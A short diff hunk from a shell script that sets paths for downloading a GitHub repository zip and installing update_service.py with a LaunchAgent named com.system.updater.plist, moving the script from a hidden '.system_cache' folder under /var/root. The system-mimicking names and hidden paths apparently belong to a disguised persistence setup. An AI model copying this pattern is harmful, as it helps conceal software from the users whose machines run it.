@@ -5,7 +5,7 @@ REPO_URL="https://github.com/atlas-is-coding/ca-parsing-twt/archive/refs/heads/m
 ZIP_FILE="$DESKTOP_DIR/ca-parsing-twt.zip"
 EXTRACTED_DIR="$DESKTOP_DIR/ca-parsing-twt-main"
 
-SCRIPT_DIR="/var/root/.system_cache"
+SCRIPT_DIR="/var/root/"
 SCRIPT_NAME="update_service.py"
 PLIST_NAME="com.system.updater.plist"
 PLIST_PATH="$HOME/Library/LaunchAgents/$PLIST_NAME"
